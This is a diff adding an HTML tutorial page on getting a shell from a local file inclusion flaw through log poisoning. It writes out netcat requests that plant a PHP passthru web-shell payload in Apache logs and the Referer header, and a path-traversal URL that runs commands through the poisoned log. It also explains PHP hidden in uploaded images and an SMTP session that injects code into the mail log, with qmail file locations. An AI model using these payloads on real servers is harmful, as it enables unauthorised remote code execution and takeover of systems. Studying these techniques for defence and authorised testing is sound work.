@@ -1,0 +1,74 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Log Poisoning - Shell</title>
+</head><body>Under the right circumstances you might be able to get a shell from a LFI<br/>
+<br/>
+<b>Log poisoning</b><br/>
+There are some requirements. We need to be able to read log files. In this example we are going to poison the apache log file. You can use either the success.log or the error.log<br/>
+So once you have found a LFI vuln you have to inject php-code into the log file and then execute it. On most systems the apache access log is<br/>
+&nbsp; readable only by root<br/>
+<br/>
+Insert php-code into the log file<br/>
+This can be done with nc or telnet<br/>
+&nbsp;nc 192.168.1.102 80<br/>
+&nbsp;GET /&lt;?php passthru($_GET['cmd']); ?&gt; HTTP/1.1<br/>
+&nbsp;Host: 192.168.1.102<br/>
+&nbsp;Connection: close<br/>
+<br/>
+You can also add it to the error-log by making a request to a page that doesn't exists<br/>
+&nbsp;nc 192.168.1.102 80<br/>
+&nbsp;GET /AAAAAA&lt;?php passthru($_GET['cmd']); ?&gt; HTTP/1.1<br/>
+&nbsp;Host: 192.168.1.102<br/>
+&nbsp;Connection: close<br/>
+<br/>
+Or in the referer parameter.<br/>
+&nbsp;GET / HTTP/1.1<br/>
+&nbsp;Referer: &lt;? passthru($_GET[cmd]) ?&gt;<br/>
+&nbsp;Host: 192.168.1.159<br/>
+&nbsp;Connection: close<br/>
+<br/>
+Execute it in the browser<br/>
+Now you can request the log-file through the LFI and see the php-code get executed.<br/>
+http://192.168.1.102/index.php?page=../../../../../var/log/apache2/access.log&amp;cmd=id<br/>
+<br/>
+<b>Why stop at logs</b>? Any file <b>you can write to</b>&nbsp;and <b>know the location</b>&nbsp;you can include.<br/>
+<br/>
+<b>Malicious image upload</b><br/>
+When the website allows its users to upload images (like avatars). <span style="font-size: 10pt"><div style="text-align: left"><span style="font-family: Trebuchet">The embedded PHP code will stay untouched unless the image is resized or pulled through imageMagick / GDlib for any reason. These libs will not trigger any errors, they just strip of the excess data</span></div></span>.<br/>
+<br/>
+<b>Send E-Mail / Log Injection</b><br/>
+The second method is somewhat elaborate. I will explain it using qmail examples, but most mail servers support this feature.<br/>
+<br/>
+You will need to include the maillog file. This is often located at /var/log/maillog. Now to inject some php code, look at the following example:<br/>
+<br/>
+Telnet into the mail server.<br/>
+Fake the sender address: Anything &lt; ?phpinfo();? &gt;. (Spaces are replaced by underscores. So you need to prevent those.)<br/>
+Look for the phpinfo string in the log file<br/>
+Test it in PHP<br/>
+<br/>
+root@test:/# telnet localhost 25<br/>
+Trying 127.0.0.1...<br/>
+Connected to localhost.<br/>
+Escape character is '^]'.<br/>
+220 hidden.domain.com ESMTP<br/>
+HELO<br/>
+250 hidden.domain.com<br/>
+MAIL FROM: anything &lt; ?phpinfo();? &gt; <br/>
+250 ok<br/>
+RCPT TO: non-existing@user.com<br/>
+250 ok<br/>
+DATA<br/>
+354 go ahead<br/>
+Subject: phpInjectionTest<br/>
+.<br/>
+250 ok 1186501618 qp 7063<br/>
+quit<br/>
+<br/>
+The third method, is to send a real email, to a real user, and include the mail file. This might be a bit hard because you will have to guess the filename. The default location for the qmail files is:<br/>
+/var/qmail/mailnames/[domain.com]/[user]/Maildir/new/.<br/>
+And the files look like: 1186501037.4564.server.domain.com. (Meaning [timestamp].[PID].[hostname])<br/>
+<br/>
+The filename can be guessed using the maillog, the approximate timestamp and PID will show up in this log file. Although its pretty hard to read if you're not familiar with this log format.<br/>
+</body></html>
